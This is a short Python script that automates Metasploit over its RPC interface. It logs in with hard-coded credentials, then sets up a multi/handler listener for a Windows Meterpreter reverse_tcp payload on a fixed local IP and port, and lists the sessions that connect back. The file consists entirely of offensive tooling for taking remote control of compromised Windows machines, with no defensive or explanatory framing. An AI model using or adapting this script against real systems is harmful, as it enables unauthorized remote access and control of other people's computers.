import msfrpc

# Function to create the MSF .rc files
def sploiter():
    client = msfrpc.Msfrpc({})
    client.login('msf', 'abc123')
    ress = client.call('console.create')
    console_id = ress['id']
    LHOST='192.168.1.5'
    listen = """use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 12315
set LHOST """+LHOST+"""
exploit
"""
    print "[+] Setting up listener on: "+LHOST+":12315"
    client.call('console.write',[console_id,listen])
    lres = client.call('console.read',[console_id])
    print lres['data']
    print "------------"
    lres2 = client.call('console.read', [console_id])
    print lres2['data']
    print "------------"

    shell = """sessions -i
    """
    client.call('console.write', [console_id, shell])
    lres3 = client.call('console.read', [console_id])
    print lres3['data']
def main():

    sploiter()

if __name__ == "__main__":
      main()